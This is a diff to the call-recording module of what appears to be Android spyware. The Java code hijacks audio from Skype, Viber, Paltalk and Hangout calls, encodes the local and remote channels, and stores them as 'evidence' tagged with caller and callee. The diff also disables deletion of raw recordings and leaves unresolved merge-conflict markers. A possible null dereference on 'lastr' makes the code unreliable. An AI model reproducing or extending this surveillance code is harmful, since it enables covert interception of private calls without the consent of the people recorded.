@@ -165,7 +165,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + "(actualStart): starting audio storage management");
 			}
 
+<<<<<<< HEAD
 			if (installHijack()){
+=======
+			if (installHijack()) {
+>>>>>>> 1e46e3fcc3c3d495a61ba66521576c7fecab681c
 				startWatchAudio();
 			}
 		}
@@ -209,14 +213,15 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 				// Add to list
 				if (addToEncodingList(AudioEncoder.getAudioStorage() + file) == true) {
-					synchronized (sync) {
-						if (Cfg.DEBUG) {
-							Check.log(TAG + "(onEvent): signaling EncodingTask thread");
-						}
-
-						encodingTask.wake();
+					// synchronized (sync) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + "(onEvent): signaling EncodingTask thread");
 					}
+
+					encodingTask.wake();
+					// }
 				}
+
 			}
 		};
 
@@ -243,7 +248,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 			return false;
 		}
-		
+
 		return true;
 	}
 
@@ -510,7 +515,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				Check.log(TAG + " (saveCallEvidence): deleting file: " + file);
 			}
 
-			file.delete();
+			// TODO: zeno rimettere delete
+			//file.delete();
 
 			return true;
 		} else {
@@ -908,10 +914,13 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 	}
 
+	Chunk lastr = null;
+	boolean started = false;
+
 	// start: call start date
 	// sec_length: call length in seconds
 	// type: call type (Skype, Viber, Paltalk, Hangout)
-	public void encodeChunks(String f) {
+	public synchronized void encodeChunks(String f) {
 		int first_epoch, last_epoch;
 		AudioEncoder audioEncoder = new AudioEncoder(f);
 
@@ -921,25 +930,19 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		// Now rawPcm contains the raw data
 		String encodedFile = f + ".err";
 
+		boolean remote = encodedFile.endsWith("-r.tmp.err");
+
 		if (audioEncoder.encodetoAmr(encodedFile, audioEncoder.resample())) {
 			Date begin = new Date(first_epoch * 1000L);
 			Date end = new Date(last_epoch * 1000L);
-
-			int remote;
-
-			if (encodedFile.endsWith("-r.tmp.err")) {
-				remote = 1;
-			} else {
-				remote = 0;
-			}
 
 			if (!updateCallInfo(callInfo, false)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (encodeChunks): unknown call program");
 				}
-				return;
+				// return;
 			}
-
+			
 			String caller = callInfo.getCaller();
 			String callee = callInfo.getCallee();
 
@@ -951,19 +954,44 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			} else {
 				// Encode to evidence
 				// TODO add caller/callee phone number and right timestamps
-				saveCallEvidence(caller, callee, true, begin, end, encodedFile, false, remote, callInfo.programId);
+				int channel = remote ? 1 : 0;
+
+				if (!started) {
+					if (remote) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (encodeChunks): saving, possibly discarted, remote: " + begin);
+						}
+						lastr = new Chunk(encodedFile, begin, end, remote);
+					} else {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (encodeChunks): first LOCAL: " + encodedFile);
+						}
+						started = true;
+						saveCallEvidence(caller, callee, true, lastr.begin, lastr.end, lastr.encodedFile, false,
+								lastr.channel, callInfo.programId);
+						saveCallEvidence(caller, callee, true, begin, end, encodedFile, false, channel,
+								callInfo.programId);
+					}
+				} else {
+					saveCallEvidence(caller, callee, true, begin, end, encodedFile, false, channel, callInfo.programId);
+				}
 			}
 
 			// We have an end of call and it's on both channels
 			if (audioEncoder.isLastCallFinished() && encodedFile.endsWith("-r.tmp.err")) {
+
 				// After encoding create the end of call marker
 				if (callInfo.delay) {
 					saveAllEvidences(chunks, begin, end);
 				} else {
-					closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
+					if (callInfo.valid)
+						closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
 				}
 				callInfo = new CallInfo();
 				chunks = new ArrayList<Chunk>();
+
+				started = false;
+				lastr = null;
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(encodeChunks): end of call reached");
@@ -976,9 +1004,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			Check.log(TAG + "(encodeChunks): deleting " + f);
 		}
 
-		// Defensive, saveCallEvidence()/closeCallEvidence() already removes the
-		// file
-		audioEncoder.removeRawFile();
+		// TODO zeno rimettere delete
+		//audioEncoder.removeRawFile();
 
 	}
 
@@ -992,12 +1019,30 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		String caller = callInfo.getCaller();
 		String callee = callInfo.getCallee();
+
+		Chunk lastr = null;
+		boolean started = false;
+
 		for (Chunk chunk : chunks) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveAllEvidences) saving chunk: " + chunk.encodedFile);
+			if (!started) {
+				if (chunk.remote) {
+					lastr = chunk;
+				} else {
+					started = true;
+				}
+				
+				saveCallEvidence(caller, callee, true, lastr.begin, lastr.end, lastr.encodedFile, false, lastr.channel,
+						callInfo.programId);
+				saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.channel,
+						callInfo.programId);
+			} else {
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveAllEvidences) saving chunk: " + chunk.encodedFile);
+				}
+				saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.channel,
+						callInfo.programId);
 			}
-			saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.remote,
-					callInfo.programId);
 
 		}
 
